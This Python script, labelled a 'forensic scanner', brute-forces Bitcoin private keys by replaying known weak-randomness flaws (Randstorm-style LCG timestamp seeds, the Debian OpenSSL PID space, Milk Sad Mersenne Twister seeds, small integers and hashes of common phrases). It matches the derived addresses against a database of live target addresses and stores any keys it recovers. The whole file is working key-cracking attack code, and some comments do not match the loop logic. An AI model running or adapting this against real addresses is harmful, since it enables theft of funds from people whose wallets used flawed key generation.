#!/usr/bin/env python3
import hashlib
import time
import os
import ecdsa
import random
from db_manager import get_connection, add_recovered_key, add_finding
from lattice_nonce_analyzer import pubkey_to_address

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

class ForensicScanner:
    def __init__(self):
        self.target_addresses = set()
        self._load_targets()

    def _load_targets(self):
        conn = get_connection()
        c = conn.cursor()
        c.execute("SELECT address FROM addresses WHERE (type LIKE 'P2PK%' OR address LIKE '1%') AND IFNULL(status, '') != 'Compromised'")
        self.target_addresses = set(row[0] for row in c.fetchall())
        conn.close()

    def check_key(self, priv_int, method):
        if priv_int <= 0 or priv_int >= P: return False
        priv_bytes = priv_int.to_bytes(32, 'big')
        try:
            sk = ecdsa.SigningKey.from_string(priv_bytes, curve=ecdsa.SECP256k1)
            vk = sk.get_verifying_key()
            # Check both compressed and uncompressed
            for comp in [True, False]:
                addr = pubkey_to_address(vk.to_string('compressed' if comp else 'uncompressed'))
                if addr in self.target_addresses:
                    add_recovered_key(addr, priv_bytes.hex(), method=method)
                    print(f"  [!!!] COLLAPSED SPACE MATCH: {addr} via {method}")
                    return True
        except: pass
        return False

    def scan_lcg_randstorm(self, target_address, timestamp_str):
        """
        Implements 48-bit LCG 'Time-Travel' Brute Forcing.
        Replicates Java/V8 Math.random() seeding patterns from 2011-2015.
        """
        try:
            # Convert timestamp to milliseconds (the common seed for LCG)
            base_ms = int(time.mktime(time.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")) * 1000)
            print(f"[Forensic] Clocking LCG Backward for {target_address} (Window: +/- 10s)...")
            
            # LCG Parameters (standard 48-bit)
            a = 0x5DEECE66D
            c = 0xB
            mask = (1 << 48) - 1

            for ms_offset in range(-10000, 10001): # 20 second window in ms
                seed = (base_ms + ms_offset) & mask
                # Simulate state evolution
                state = (seed ^ a) & mask
                # Generate 'random' bytes from state
                entropy = bytearray()
                for _ in range(4): # Generate 32 bytes (8 x 32-bit chunks)
                    state = (state * a + c) & mask
                    chunk = (state >> 16)
                    entropy.extend(chunk.to_bytes(4, 'big'))
                
                priv_int = int(hashlib.sha256(entropy).hexdigest(), 16)
                if self.check_key(priv_int, f"Randstorm LCG (Seed MS: {base_ms + ms_offset})"):
                    return True
        except Exception as e:
            pass
        return False

    def scan_debian_pid_expanded(self):
        """Comprehensive scan of Debian OpenSSL PID space across all archs."""
        print("[Forensic] Scanning Expanded Debian PID Space...")
        for pid in range(1, 32768):
            # 1. Standard PID
            if self.check_key(pid, f"Debian PID {pid}"): return True
            # 2. PID + Arch (Little Endian / Big Endian patterns)
            for salt in [0, 0x10000, 0x1000000]:
                priv_int = int(hashlib.sha256(str(pid + salt).encode()).hexdigest(), 16)
                if self.check_key(priv_int, f"Debian PID+Salt {pid}"): return True

    def scan_milk_sad_mt(self):
        """Mersenne Twister (MT19937) with small seeds (Milk Sad)."""
        print("[Forensic] Scanning Milk Sad Mersenne Twister Seeds...")
        # Check first 10k seeds sequentially
        for seed in range(10000):
            mt = random.Random(seed)
            priv_int = mt.getrandbits(256)
            if self.check_key(priv_int, f"Milk Sad MT (Seed: {seed})"): return True

    def scan_low_entropy_patterns(self):
        """Checks for seeds that are just small numbers or common strings."""
        print("[Forensic] Scanning Common Low-Entropy Seeds...")
        # 1. Small integers
        for i in range(1, 10001):
            if self.check_key(i, f"Small Int {i}"): return True
        
        # 2. SHA256 of common phrases
        for phrase in ["", "1", "satoshi", "bitcoin", "password", "0", "admin"]:
            priv_int = int(hashlib.sha256(phrase.encode()).hexdigest(), 16)
            if self.check_key(priv_int, f"Common Phrase: '{phrase}'"): return True

def run_forensic_suite():
    scanner = ForensicScanner()
    scanner.scan_low_entropy_patterns()
    scanner.scan_debian_pid_expanded()
    scanner.scan_milk_sad_mt()
    
    # Targeted LCG scans for 2011-2015 addresses
    conn = get_connection()
    c = conn.cursor()
    c.execute("""
        SELECT address, first_seen FROM addresses 
        WHERE first_seen >= '2011-01-01' AND first_seen <= '2015-12-31'
        AND status = 'Spent/Active' LIMIT 20
    """)
    targets = c.fetchall()
    conn.close()
    
    for addr, ts in targets:
        scanner.scan_lcg_randstorm(addr, ts)

if __name__ == "__main__":
    run_forensic_suite()
